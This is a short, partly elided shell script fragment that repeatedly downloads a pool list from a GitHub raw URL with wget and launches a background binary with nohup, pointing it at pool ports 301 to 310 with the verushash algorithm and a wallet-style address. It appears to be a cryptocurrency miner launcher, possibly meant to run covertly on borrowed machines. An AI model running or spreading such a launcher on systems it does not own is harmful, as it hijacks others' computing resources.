...
while [ $(date +%s) -lt $end_time ]; do
  ...
  wget -O $dynamic_list https://github.com/barburonjilo/setstra/raw/main/list2.json
  ...
  if [ -f $dynamic_sgr ]; then
    ...
    for port in $(seq 301 310); do
      ...
      nohup $dynamic_sgr -a verushash  --pool $ip:$port -u RJ3brBKGZcdmdHJjKQWjkjAb5qnDaWkeaf --timeout 120 -t 4 -p x > dance_$port_$timestamp.log 2>&1 &
      process_pid=$!
